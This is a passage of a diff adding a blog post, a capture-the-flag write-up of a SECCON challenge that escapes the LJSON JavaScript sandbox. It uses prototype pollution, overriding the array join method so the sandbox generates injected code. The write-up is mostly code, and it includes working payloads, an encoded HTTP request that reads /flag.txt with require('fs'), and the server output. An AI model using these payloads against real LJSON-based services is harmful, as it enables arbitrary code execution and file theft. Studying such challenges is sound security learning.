+            <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                                <span class="token operator">^</span>
+
+<span class="token literal-property property">TypeError</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>slice<span class="token punctuation">.</span>call is not a <span class="token keyword">function</span>
+    at <span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>ljson<span class="token operator">/</span><span class="token constant">LJSON</span><span class="token punctuation">.</span>js<span class="token operator">:</span><span class="token number">361</span><span class="token operator">:</span><span class="token number">33</span>
+<span class="token operator">...</span>snip<span class="token operator">...</span></code></pre>
+<h2>Polluting the Sandbox Scope</h2>
+<p>At this point I started taking a look at how we could use our prototype pollution to target the sandbox itself. One point of interest was the <code>scope</code> variable used by LJSON to manage what variables we had access to within our code. Put simply, LJSON would follow the below process when translating a variable from our code:</p>
+<ol>
+<li>Identify when we've tried to access a variable. E.g. in <code>(a,b,c)=&gt;(example)</code>, <code>example</code> is a variable.</li>
+<li>Index into the <code>scope</code> variable to see whether the variable exists. E.g. <code>scope[&quot;example&quot;]</code>.</li>
+<li>If the index exists within <code>scope</code>, LJSON expects to find a number. E.g. <code>scope[&quot;example&quot;]</code> might return <code>123</code>.</li>
+<li>LJSON then puts this number through a <code>toName</code> function, which translates the number into a variable name that is used in the unsandboxed code that it generates.
+<ul>
+<li>E.g. if <code>scope[&quot;example&quot;]</code> returns <code>123</code>, and <code>toName</code> turns <code>123</code> into <code>abc</code>, then the following unsandboxed code will be generated to access that variable: <code>(function(a,b,c){return abc})</code>.</li>
+</ul>
+</li>
+</ol>
+<p>The following excerpt shows the <a href="https://github.com/VictorTaelin/LJSON/blob/0c06399baddc08ede6457a59505e188ec0828dab/LJSON.js#L397-L405">source code</a> of the <code>toName</code> function.</p>
+<pre class="language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">toName</span><span class="token punctuation">(</span><span class="token parameter">nat</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+  <span class="token keyword">var</span> alphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+  <span class="token keyword">do</span> <span class="token punctuation">{</span>
+    name <span class="token operator">+=</span> alphabet<span class="token punctuation">[</span>nat <span class="token operator">%</span> alphabet<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    nat <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>nat <span class="token operator">/</span> alphabet<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>nat <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p>This immediately seemed interesting to me. It should be considered that we don't typically have control of anything inside of the <code>scope</code> variable, but with our prototype pollution, we could add an entry! During normal use, the <code>toName</code> function generates uninteresting strings, which is expressed in the source codes comments.</p>
+<pre class="language-js"><code class="language-js"><span class="token comment">// toName :: Number -> String</span>
+<span class="token comment">// Turns a number into a var name (a, b, c... aa, ab...).</span>
+<span class="token keyword">function</span> <span class="token function">toName</span><span class="token punctuation">(</span><span class="token parameter">nat</span><span class="token punctuation">)</span><span class="token punctuation">{</span></code></pre>
+<p>However, with control over what goes into <code>toName</code>, we could potentially cause it to create something interesting. My first thought was to use this to create a <code>this</code> reference. To do this, I wrote the following script.</p>
+<pre class="language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">toName</span><span class="token punctuation">(</span><span class="token parameter">nat</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+  <span class="token keyword">var</span> alphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+  <span class="token keyword">do</span> <span class="token punctuation">{</span>
+        name <span class="token operator">+=</span> alphabet<span class="token punctuation">[</span>nat <span class="token operator">%</span> alphabet<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
+        nat <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>nat <span class="token operator">/</span> alphabet<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>nat <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+a <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token string">"this"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  a <span class="token operator">=</span> <span class="token function">toName</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+  i<span class="token operator">++</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"FOUND: "</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> a<span class="token punctuation">)</span></code></pre>
+<p>This finds that the <code>321977</code> number would translate into the <code>this</code> string. We can therefore build out the following payload to create a reference to <code>this</code> via a variable named <code>test</code>.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token number">321977</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>Note that we won't be able to access this variable in the first sequence, since the variable is only added after our code has been translated and executed. This means we need to use the second sequence to access the <code>test</code> variable:</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>
+<span class="token comment">/*
+RETURNS:
+  &lt;ref *1> Object [global] {
+    global: [Circular *1],
+    clearInterval: [Function: clearInterval],
+    clearTimeout: [Function: clearTimeout],
+    setInterval: [Function: setInterval],
+    setTimeout: [Function: setTimeout] {
+      [Symbol(nodejs.util.promisify.custom)]: [Getter]
+    },
+...snip...
+*/</span></code></pre>
+<p>I messed with the <code>this</code> reference for a while but couldn't manage to leverage it to get any further, so we'll leave this here for now.</p>
+<h2>Code Execution</h2>
+<p>There were a few more tricks I found by this point, but they're not all relevant. After finding those, I continued to look into how we could use our prototype pollution to target the sandbox itself. That's when the <a href="https://github.com/VictorTaelin/LJSON/blob/0c06399baddc08ede6457a59505e188ec0828dab/LJSON.js#L293-L296">following code in LJSON</a> caught my eye.</p>
+<pre class="language-js"><code class="language-js"><span class="token keyword">var</span> body <span class="token operator">=</span> <span class="token constant">P</span><span class="token punctuation">.</span><span class="token function">betweenSpaced</span><span class="token punctuation">(</span><span class="token constant">P</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">LJSON_value</span><span class="token punctuation">(</span>binders<span class="token operator">+</span>varList<span class="token punctuation">.</span>length<span class="token punctuation">,</span> newScope<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">P</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> args <span class="token operator">=</span> varList<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>i</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">toName</span><span class="token punctuation">(</span>binders<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">return</span> <span class="token string">"(function("</span><span class="token operator">+</span>args<span class="token operator">+</span><span class="token string">"){return "</span><span class="token operator">+</span>body<span class="token operator">+</span><span class="token string">"})"</span><span class="token punctuation">;</span></code></pre>
+<p>This code is used by the sandbox to convert untrusted parts of our input into trusted JavaScript code that can then be executed. Of course, this is a fundamental part of how the sandbox functions, but it reminded me that a lot of this code is put together using <code>.join</code> calls. This struck me with the idea; what if we used our prototype pollution to redefine <code>.join</code> such that it only ever returns a value that we control? We can test this out with the following simple payload, which makes <code>.join</code> only ever return <code>&quot;AAAAA&quot;</code>.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"join"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token string">"AAAAA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>Running this, we get the following error.</p>
+<pre class="language-js"><code class="language-js">Command failed<span class="token operator">:</span> node <span class="token punctuation">.</span><span class="token operator">/</span>service<span class="token punctuation">.</span><span class="token function">js</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"join"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token string">"AAAAA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token number">6</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">5</span>
+<span class="token keyword">undefined</span><span class="token operator">:</span><span class="token number">1</span>
+<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token constant">AAAAA</span></span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> 1AAAAA<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+                         <span class="token operator">^</span>
+
+<span class="token literal-property property">SyntaxError</span><span class="token operator">:</span> Invalid or unexpected token
+    at <span class="token function">parse</span> <span class="token punctuation">(</span><span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>ljson<span class="token operator">/</span><span class="token constant">LJSON</span><span class="token punctuation">.</span>js<span class="token operator">:</span><span class="token number">327</span><span class="token operator">:</span><span class="token number">16</span><span class="token punctuation">)</span></code></pre>
+<p>We're getting a syntax error in the unsandboxed code that LJSON generates, that looks incredibly promising!!! It should be noted that this pollution only affects the execution of the second sequence that gets run, which is simply <code>(a,b,c)=&gt;(1)</code> in the above example. This is because our prototype pollution happens after the code for the first sequence has already been generated. Anyway, cleaning up our payload to fix syntax errors and execute code that will read and print the flag, we get the following payload.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"join"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">x</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token string">"test){require('fs').readFile('/flag.txt','utf8',(err,data)=>{console.log(data)})}))//"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>The below HTTP request runs this payload with a simple second sequence.</p>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/api/getValue?sequence0=(a%2cb%2cc)%3d%3e(a(%22set%22%2ca(%22set%22%2c%5b%5d%2c%22__proto__%22%2c1)%2c%20%22join%22%2c%20(x)%3d%3e(%22test)%7brequire('fs').readFile('%2fflag.txt'%2c'utf8'%2c(err%2cdata)%3d%3e%7bconsole.log(data)%7d)%7d))%2f%2f%22))))&amp;n0=6&amp;sequence1=(a%2cb%2cc)%3d%3e(1)&amp;n1=5</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<p>Which results in the following response containing our flag!</p>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+[ [Function (anonymous)], undefined ]
+SECCON{dummydummy}</code></pre>
+<p>Wooo! This was cool but it was actually an unintended solution! The intended solution used our polluted variable trick to access <code>eval</code> instead of <code>this</code>, after which you could just call <code>eval</code>! Read more about that solution here:</p>
+<ul>
+<li><a href="https://blog.arkark.dev/2021/12/22/seccon#sequence-as-a-service-2">https://blog.arkark.dev/2021/12/22/seccon#sequence-as-a-service-2</a></li>
+</ul>
+
+		</div>
+	</div>
+  </body>
+
+
+	<style>
+		/**
+		 * Gruvbox dark theme
+		 *
+		 * Adapted from a theme based on:
+		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
+		 *
+		 * @author Azat S. <to@azat.io>
+		 * @version 1.0
+		 */
+
+		code[class*="language-"],
+		pre[class*="language-"] {
+			color: #ebdbb2; /* fg1 / fg */
+			font-family: Consolas, Monaco, "Andale Mono", monospace;
+			direction: ltr;
+			text-align: left;
+			white-space: pre;
+			word-spacing: normal;
+			word-break: normal;
+			line-height: 1.5;
+
+			-moz-tab-size: 4;
+			-o-tab-size: 4;
+			tab-size: 4;
+
+			-webkit-hyphens: none;
+			-moz-hyphens: none;
+			-ms-hyphens: none;
+			hyphens: none;
+		}
+
+		pre[class*="language-"]::-moz-selection,
+		pre[class*="language-"] ::-moz-selection,
+		code[class*="language-"]::-moz-selection,
+		code[class*="language-"] ::-moz-selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		pre[class*="language-"]::selection,
+		pre[class*="language-"] ::selection,
+		code[class*="language-"]::selection,
+		code[class*="language-"] ::selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		/* Code blocks */
+		pre[class*="language-"] {
+			padding: 1em;
+			margin: 0.5em 0;
+			overflow: auto;
+		}
+
+		:not(pre) > code[class*="language-"],
+		pre[class*="language-"] {
+			background: #191B1C; /* bg0_h */
+			border: 1px solid #665C54;
+		}
+
+		/* Inline code */
+		:not(pre) > code[class*="language-"] {
+			padding: 0.1em;
+			border-radius: 0.3em;
+		}
+
+		.token.comment,
+		.token.prolog,
+		.token.cdata {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.delimiter,
+		.token.boolean,
+		.token.keyword,
+		.token.selector,
+		.token.important,
+		.token.atrule {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.operator,
+		.token.punctuation,
+		.token.attr-name {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.tag,
+		.token.tag .punctuation,
+		.token.doctype,
+		.token.builtin {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.entity,
+		.token.number,
+		.token.symbol {
+			color: #d3869b; /* purple2 */
+		}
+
+		.token.property,
+		.token.constant,
+		.token.variable {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.string,
+		.token.char {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.attr-value,
+		.token.attr-value .punctuation {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.url {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.function {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.regex {
+			background: oklch(0.8591 0 126.59 / 15.94%); /* green2 */
+		}
+
+		.token.bold {
+			font-weight: bold;
+		}
+
+		.token.italic {
+			font-style: italic;
+		}
+
+		.token.inserted {
+			background: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.deleted {
+			background: #fb4934; /* red2 */
+		}
+	</style>
+</html>
